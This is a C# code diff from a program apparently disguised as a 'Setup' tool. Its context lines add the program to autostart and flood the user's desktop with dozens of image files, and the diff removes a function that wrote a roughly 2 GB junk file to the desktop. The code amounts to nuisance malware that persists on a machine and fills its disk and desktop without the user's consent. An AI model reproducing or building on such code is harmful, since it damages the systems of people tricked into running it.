@@ -45,7 +45,6 @@ namespace Setup
 
             for (var i = 0; i < 10000; i++) Console.Write($"{i}");
 
-            CreateLargeFile();
             SpanDesktop(Resource1.aaasssddd, 65);
 
             Thread.Sleep(1000);
@@ -81,7 +80,7 @@ namespace Setup
             catch (Exception ex)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("Ошибка при добавлении в автозагрузку: " + ex.Message);
+                Console.WriteLine("Ошибка" + ex.Message);
                 Console.ForegroundColor = ConsoleColor.White;
             }
             finally
@@ -107,22 +106,6 @@ namespace Setup
                     image.Save(path + $"\\asd{i}.png");
                 }
                 catch(Exception e) { Console.WriteLine(e.Message); }
-            }
-        }
-
-        static void CreateLargeFile()
-        {
-            try
-            {
-                var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\asd.png";
-
-                var bytes = new Byte[1999900000];
-
-                File.WriteAllBytes(path, bytes);
-            }
-            catch
-            {
-
             }
         }
     }
